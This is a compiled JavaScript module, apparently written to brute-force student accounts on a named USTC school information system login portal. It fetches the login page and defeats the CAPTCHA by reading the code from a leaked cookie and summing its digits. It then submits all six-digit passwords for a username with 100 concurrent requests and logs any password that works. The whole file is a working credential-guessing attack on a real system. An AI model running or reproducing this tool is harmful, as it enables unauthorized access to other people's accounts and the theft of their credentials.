"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const FormData = require("form-data");
const node_fetch_1 = __importDefault(require("node-fetch"));
const cheerio = require("cheerio");
const utils_1 = __importDefault(require("./utils"));
const async_1 = __importDefault(require("async"));
const log = console.log;
const baseUrl = "http://mis.sse.ustc.edu.cn/";
const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g;
function worker(username) {
    return new Promise((resolve, reject) => {
        let success = false;
        let view_state = "";
        let password = "000000";
        const concurrency = 100;
        username = username.toLowerCase();
        log("username: ", username);
        /**
         * 获取登陆页的html
         */
        function main() {
            return __awaiter(this, void 0, void 0, function* () {
                try {
                    const result = yield node_fetch_1.default(baseUrl);
                    const cookieJar = new Map();
                    const sessionId = utils_1.default.getCookie(result);
                    cookieJar.set("sessionId", sessionId);
                    const body = yield result.text();
                    const $ = cheerio.load(body);
                    view_state = $("#__VIEWSTATE").val(); //view state字段
                    const imgUrl = body.match(pattern) || [""];
                    const url = baseUrl + imgUrl[0].replace("&amp;", "&"); //验证码url
                    const r = yield node_fetch_1.default(url, {
                        headers: {
                            "cookie": Array.from(cookieJar.values()).join(";")
                        }
                    });
                    const validate = utils_1.default.getCookie(r); //验证码
                    cookieJar.set("validate", validate);
                    const validateCode = (validate.match(/[0-9]{4}/) || [""])[0];
                    log("validate code:", validateCode);
                    let sum = 0;
                    validateCode.split("").forEach(val => {
                        sum += parseInt(val);
                    });
                    log("sum:", sum);
                    log("session", cookieJar);
                    const trypass = async_1.default.queue(function (password, done) {
                        /**
                         * 组装数据
                         */
                        const formData = new FormData();
                        formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
                        formData.append("__VIEWSTATE", view_state);
                        formData.append("winLogin$sfLogin$txtUserLoginID", username);
                        formData.append('winLogin$sfLogin$txtPassword', password);
                        formData.append('winLogin$sfLogin$txtValidate', sum + "");
                        return node_fetch_1.default(baseUrl + "default.aspx", {
                            method: "post",
                            headers: {
                                cookie: Array.from(cookieJar.values()).join(";")
                            },
                            body: formData
                        })
                            .then(login => {
                            /**
                             * iflysse是登陆成功时拿到的cookie值
                             */
                            const iflysse = utils_1.default.getCookie(login);
                            if (iflysse.length === 0) {
                                log("failed ", "password: ", password);
                            }
                            else {
                                log("success ", "用户名: ", username, "密码: ", password);
                                success = true;
                                resolve("success " + "用户名: " + username + "密码: " + password);
                            }
                            done();
                        })
                            .catch(e => {
                            log(e);
                            done();
                        });
                    }, concurrency);
                    while (parseInt(password) <= 999999 && !success) {
                        trypass.push(password, () => {
                            log("length", trypass.length());
                            log("running", trypass.running());
                            if (success) {
                                trypass.kill();
                            }
                        });
                        password = increase(password);
                    }
                }
                catch (error) {
                    log(error);
                }
            });
        }
        main();
    });
}
exports.worker = worker;
function increase(num) {
    num = "" + (parseInt(num) + 1);
    if (num.length < 6) {
        const len = num.length;
        for (let i = 0; i < 6 - len; i++) {
            num = 0 + num;
        }
    }
    return num;
}
